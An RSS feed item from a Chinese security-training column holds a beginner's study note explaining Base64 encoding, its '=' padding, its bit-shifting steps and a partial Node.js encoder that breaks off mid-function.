<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0" xmlns:media="http://search.yahoo.com/mrss/">
<channel>
<title>二向箔安全学院</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/</link>
<description>前沿、专业的网络空间攻防实训 专注于提供最前沿的网络空间安全攻防人才培养的解决方案。</description>
<language>zh-cn</language>
<lastBuildDate>Sun, 15 Dec 2019 11:18:37 +0800</lastBuildDate>
<item>
<title>小白学习笔记（一）--探秘base64</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2019-12-11-96725834.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/96725834&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;我相信很多人（大佬除外）都有这样的疑惑，就是base64加密后有时后面有一个“=”；有时有两个“=”；有时没有“=”。在做CTF题的时候，遇到没有“=”的时候，都怀疑自己是不是哪一步搞错了。&lt;/p&gt;&lt;p&gt;像这样：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;dHdvc2VjdXJpdHk=&lt;/li&gt;&lt;li&gt;d2VsY29tZQ==&lt;/li&gt;&lt;li&gt;eW91&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;今天，我们就来一探究竟。&lt;/p&gt;&lt;h2&gt;Base64&lt;/h2&gt;&lt;p&gt;&lt;b&gt;什么是base64加密？&lt;/b&gt;&lt;/p&gt;&lt;blockquote&gt;Base64 是网络上最常见的用于传输 8Bit 字节码的编码方式之一，Base64 就是一种基于 64 个可打印字符来表示二进制数据的方法。Base64 编码是从二进制到字符的过程，可用于在HTTP环境下传递较长的标识信息。采用 Base64 编码具有不可读性，需要解码后才能阅读。&lt;/blockquote&gt;&lt;p&gt;简而言之，一种只有 64 个对象的 8Bit 编码。表单如下：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;0　A　　17　R　　　34　i　　　51　z

1　B　　18　S　　　35　j　　　52　0

2　C　　19　T　　　36　k　　　53　1

3　D　　20　U　　　37　l　　　54　2

4　E　　21　V　　　38　m　　　55　3

5　F　　22　W　　　39　n　　　56　4

6　G　　23　X　　　40　o　　　57　5

7　H　　24　Y　　　41　p　　　58　6

8　I　　25　Z　　　42　q　　　59　7

9　J　　26　a　　　43　r　　　60　8

10　K　　27　b　　　44　s　　　61　9

11　L　　28　c　　　45　t　　　62　+

12　M　　29　d　　　46　u　　　63　/

13　N　　30　e　　　47　v

14　O　　31　f　　　48　w

15　P　　32　g　　　49　x

16　Q　　33　h　　　50　y&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;我们想要知道它末尾的“=”是如何产生的，就要了解其编码的过程。&lt;/p&gt;&lt;p&gt;&lt;b&gt;编码的过程？&lt;/b&gt;&lt;/p&gt;&lt;p&gt;Base64 编码在数据传输过程中应用广泛，例如传统的邮件只支持可见字符的传送，像 ASCII 码的控制字符就不能通过邮件传送。这样就受到了很大的限制，比如图片二进制流的每个字节不可能全部是可见字符，所以就传送不了。正好 Base64 编码使用 64 个可见字符来表示二进制数据。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-69a1611f1af279c737e00ec46b427691_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1141&quot; data-rawheight=&quot;128&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1141&quot; data-original=&quot;https://pic2.zhimg.com/v2-69a1611f1af279c737e00ec46b427691_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-69a1611f1af279c737e00ec46b427691_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1141&quot; data-rawheight=&quot;128&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1141&quot; data-original=&quot;https://pic2.zhimg.com/v2-69a1611f1af279c737e00ec46b427691_r.jpg&quot; data-actualsrc=&quot;https://pic2.zhimg.com/v2-69a1611f1af279c737e00ec46b427691_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;由图中可以看出 base64 编码整个过程：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;取源文本二进制位&lt;/li&gt;&lt;li&gt;对源文本二进制位按 6 位划分得到 base64 划分二进制位&lt;/li&gt;&lt;li&gt;在 base64 划分二进制位前面添加两个 0，得到 base64 字典索引&lt;/li&gt;&lt;li&gt;查 base64 表，得到 base64 对应的值&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;b&gt;Base64 编码解析&lt;/b&gt;&lt;/p&gt;&lt;p&gt;我们通过上面的图可以看出，每 3 字节源文本会生成 4 字节 base64 编码（&amp;#34;Nod&amp;#34; 生成 &amp;#34;Tm9k&amp;#34;）,那么我们在编码的时候每次处理三个字节的数据（生成不足 4 字节的用&amp;#34;=&amp;#34;补充），处理步骤如下:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;取第一个字节的前 6 位并在前面加上 00，这里我们使用&amp;#34;右移&amp;#34;&lt;br/&gt;&amp;#39;N&amp;#39; =&amp;gt; &amp;#39;01001110&amp;#39; =&amp;gt; 右移两位 =&amp;gt; &amp;#39;00010011&amp;#39; =&amp;gt; 19 =&amp;gt; 查表 =&amp;gt; &amp;#39;T&amp;#39;&lt;/li&gt;&lt;li&gt;取第一个字节的后 2 位(用&amp;#39;与&amp;#39;和&amp;#39;左移&amp;#39;)，加上第二个字节的前 4 位&lt;br/&gt;&amp;#39;N&amp;#39; =&amp;gt; &amp;#39;01001110&amp;#39; =&amp;gt; 与运算 &amp;#39;00000011&amp;#39; =&amp;gt; &amp;#39;00000010&amp;#39; =&amp;gt; 左移 4 位 =&amp;gt; &amp;#39;00100000&amp;#39;&lt;br/&gt;&amp;#39;o&amp;#39; =&amp;gt; &amp;#39;01101111&amp;#39; =&amp;gt; 右移 4 位 =&amp;gt; &amp;#39;00000110&amp;#39; =&amp;gt; &amp;#39;00100000&amp;#39; 加上 &amp;#39;00000110&amp;#39; =&amp;gt; &amp;#39;00100110&amp;#39; =&amp;gt; 查表 =&amp;gt; &amp;#39;m&amp;#39;&lt;/li&gt;&lt;li&gt;后面的依次类推，使用&amp;#34;与&amp;#34;,&amp;#34;右移&amp;#34;,&amp;#34;左移&amp;#34;操作将 3 字节变成 4 字节&lt;/li&gt;&lt;/ul&gt;&lt;blockquote&gt;“与”运算是计算机中一种基本的逻辑运算方式，符号表示为 &amp;amp;。&lt;br/&gt;运算规则：0&amp;amp;0=0;  0&amp;amp;1=0;   1&amp;amp;0=0;    1&amp;amp;1=1&lt;br/&gt;即：两位同时为“1”，结果才为“1”，否则为0&lt;br/&gt;例如：3&amp;amp;5  即 0000 0011&amp;amp; 0000 0101 = 00000001  因此，3&amp;amp;5的值得1。&lt;br/&gt;“左移”将一个运算对象的各二进制位全部左移若干位（左边的二进制丢弃，右边补0）&lt;br/&gt;例如：&lt;br/&gt;00001010&amp;lt;&amp;lt;2 = 00101000&lt;br/&gt;10001010&amp;lt;&amp;lt;3 = 01010000&lt;/blockquote&gt;&lt;p&gt;解码与之相反，将 4 字节的 base64 编码进行还原为 3 字节的源文本。&lt;/p&gt;&lt;h2&gt;Base64 编码解码实现✔&lt;/h2&gt;&lt;p&gt;这里以 node.js 为例。&lt;/p&gt;&lt;p&gt;先实现 base64 的字典（算是 base64 的核心吧）&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;base64EncodeDict&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;baseDecodeDict&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;0&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;52&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;1&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;53&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;2&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;54&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;3&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;55&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;4&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;56&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;5&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;57&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;6&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;58&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;7&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;59&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;8&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;60&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;9&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;61&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;A&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;B&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;C&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;D&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;E&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;F&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;G&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;H&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;I&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;J&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;K&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;L&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;M&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;N&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;13&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;O&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;P&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;R&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;S&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;18&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;T&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;19&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;U&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;V&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;W&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;22&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;X&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;23&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Y&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Z&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;25&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;26&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;27&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;28&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;29&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;g&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;33&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;34&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;35&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;k&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;36&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;l&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;37&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;m&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;38&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;39&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;o&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;41&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;42&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;43&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;44&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;45&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;u&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;46&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;47&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;w&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;48&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;49&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;50&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;z&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;51&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;+&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;62&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&amp;#39;/&amp;#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;63&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;编码实现&lt;/b&gt;&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Base64Encode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;aim&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[];&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// 获取第一个字符
&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;&lt;/span&gt;        &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;cr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;charCodeAt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;aim&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;base64EncodeDict&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// 获取第二个字符
&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;&lt;/span&gt;        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;source&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
